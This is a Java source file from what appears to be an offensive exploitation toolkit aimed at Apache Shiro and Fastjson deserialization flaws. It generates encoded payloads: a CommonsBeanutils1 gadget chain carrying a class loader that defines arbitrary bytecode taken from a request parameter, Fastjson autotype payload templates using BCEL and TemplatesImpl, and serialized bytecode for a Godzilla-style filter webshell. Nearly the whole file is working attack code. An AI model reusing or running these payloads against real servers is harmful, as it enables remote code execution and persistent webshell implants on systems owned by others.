package com.sma11new.exp.shiro.attack.bypass;

import com.mchange.v2.ser.SerializableUtils;
import com.sma11new.exp.shiro.attack.echo.CustomLoader;
import com.sma11new.exp.shiro.attack.payloads.ObjectPayload;
import com.sma11new.exp.shiro.attack.shell.*;
import com.sma11new.exp.shiro.attack.util.Gadgets;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.codec.Base64;

import java.net.URLEncoder;

public class SingleExploit {

    public void cbOrCCPayload() {
        try {
            String loaderCodeWithSecondWay = "public B() {\n" +
                    "   javax.servlet.http.HttpServletRequest req = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +

                    "   byte[] classBytes = java.util.Base64.getDecoder().decode(req.getParameter(\"clazz\"));\n"+
                    "   java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
                    "   defineClassMethod.setAccessible(true);\n"+
                    "   ((Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{classBytes, new Integer(0), new Integer(classBytes.length)})).newInstance().equals(req);\n"+
                    "}";
            CustomLoader.currentLoaderCode = loaderCodeWithSecondWay;

            String echoOpt = "CustomLoader", gadgetOpt = "Fastjson1";
            gadgetOpt = "CommonsBeanutils1";
            Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass(gadgetOpt);
            ObjectPayload<?> gadgetPayload = gadgetClazz.newInstance();
            Object template = Gadgets.createTemplatesImpl(echoOpt);
            Object chainObject = gadgetPayload.getObject(template);
            byte[] payload = SerializableUtils.toByteArray(chainObject);
            System.out.println(URLEncoder.encode(Base64.encodeToString(payload), "UTF-8"));
            ClassPool classPool = ClassPool.getDefault();
            CtClass clazz = classPool.get(GodzillaFilter.class.getName());
            System.out.println(URLEncoder.encode(Base64.encodeToString(clazz.toBytecode()), "UTF-8"));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void fastJsonPayload() {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(OnlyExec.class.getName());
            // CtClass clazz = pool.get(ClassLoaderServlet.class.getName());

            // Class<?> abstTranslet = AbstractTranslet.class;
            // CtClass superClass = pool.get(abstTranslet.getName());
            // clazz.setSuperclass(superClass);
            byte[] payload = clazz.toBytecode();

            /*
            // JSONObject.parse
            {
              {
              "@type": "com.alibaba.fastjson.JSONObject",
              "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                  "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$xxxxxxxxxxxx"
              }
            }: "x"
            }
             */

            /*
            // JSONObject.parseObject
            {
                "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
                "_bytecodes": ["base64 code"],
                "_name": "a",
                "_tfactory": {},
                "_outputProperties": {}
            }
             */

            // System.out.println(Base64.encodeToString(payload));

            // Not extends any class
            String codeBcel = Utility.encode(payload, true);
            System.out.println("$$BCEL$$"+codeBcel);

            System.out.println(URLEncoder.encode(Base64.encodeToString(payload)));
            System.out.println(URLEncoder.encode(Base64.encodeToString(pool.get(GodzillaFilter.class.getName()).toBytecode())));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        new SingleExploit().fastJsonPayload();
        // new SingleExploit().cbOrCCPayload();
    }

}
